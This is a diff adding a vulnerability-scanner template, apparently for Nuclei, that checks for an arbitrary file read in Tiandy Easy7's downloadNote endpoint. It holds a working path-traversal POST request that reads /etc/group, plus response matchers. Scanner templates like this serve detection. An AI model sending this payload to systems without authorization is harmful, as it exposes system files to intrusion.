@@ -1,0 +1,36 @@
+id: tiandy-easy7-downloadnote-file-read
+info:
+  name: Tiandy Easy7 Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tiandy Easy7 Comprehensive Management Platform downloadNote arbitrary file read vulnerability.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/file/downloadNote HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fullName=1.png&fileName=../../../etc/group
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "bin:"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: regex
+        part: header
+        regex:
+          - "filename=1\\.png\\.doc"
